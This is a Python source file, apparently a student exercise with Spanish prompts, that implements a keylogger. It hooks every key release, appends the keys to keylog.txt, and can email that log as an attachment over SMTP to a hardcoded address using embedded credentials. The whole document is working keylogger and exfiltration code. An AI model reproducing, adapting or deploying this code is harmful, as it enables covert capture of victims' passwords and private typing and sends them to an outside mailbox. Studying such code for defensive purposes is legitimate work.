import keyboard
import smtplib
import yagmail

def callback(event):
    print(event.name) 
    output(event.name)  

def output(event_name):
    with open('keylog.txt', 'a') as f:
        f.write(event_name + '\n')

def send_email(sender_email , receiver_email ,password):
  
    yag = yagmail.SMTP(sender_email, password)
    yag.send(to=receiver_email, subject='Registros de Keylogger', contents='Se adjunta el archivo de registros', attachments='keylog.txt')

def main():
    print("---------------------------------")
    print("---------- KeyLogger ------------")
    print("---------------------------------")
    while True:
        respuesta_email = input("¿Deseas enviar los registros por email? (yes/no): ")
        respuesta_guardar = input("¿Deseas guardar los registros en texto plano? (yes/no): ")
        
        if respuesta_email.lower() in ['yes', 'y']:
            send_email("Paola_VB@ciencias.unam.mx", "janet1204@ciencias.unam.mx", "pass")
        
        if respuesta_guardar.lower() in ['yes', 'y']:
            keyboard.on_release(callback)
        
        if respuesta_email.lower() in ['no', 'n'] and respuesta_guardar.lower() in ['no', 'n']:
            print("Interrumpiendo la ejecución del programa...")
            break
        
        exit_flag = input("¿Deseas salir del programa? (exit): ")
        if exit_flag.lower() == 'exit':
            print("Terminando la ejecución del programa...")
            break

if __name__ == "__main__":
    main()
